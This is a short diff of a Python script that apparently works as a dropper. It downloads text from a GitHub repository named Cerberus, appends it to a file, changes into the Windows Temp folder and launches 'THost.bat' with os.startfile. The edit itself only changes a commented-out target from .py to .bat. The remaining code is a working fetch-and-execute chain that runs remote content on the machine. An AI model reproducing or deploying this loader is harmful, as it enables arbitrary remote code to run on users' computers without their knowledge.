@@ -11,7 +11,7 @@ with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerber
     data = response.read().decode("utf-8")
     with open(filename, "a+") as fp: fp.write(str(data))
 
-#urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/TSource3.txt", "/Users/shrek/AppData/Local/Temp/THost.py")
+#urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/TSource3.txt", "/Users/shrek/AppData/Local/Temp/THost.bat")
 
 os.chdir("/Users/shrek/AppData/Local/Temp")
 os.startfile("THost.bat")
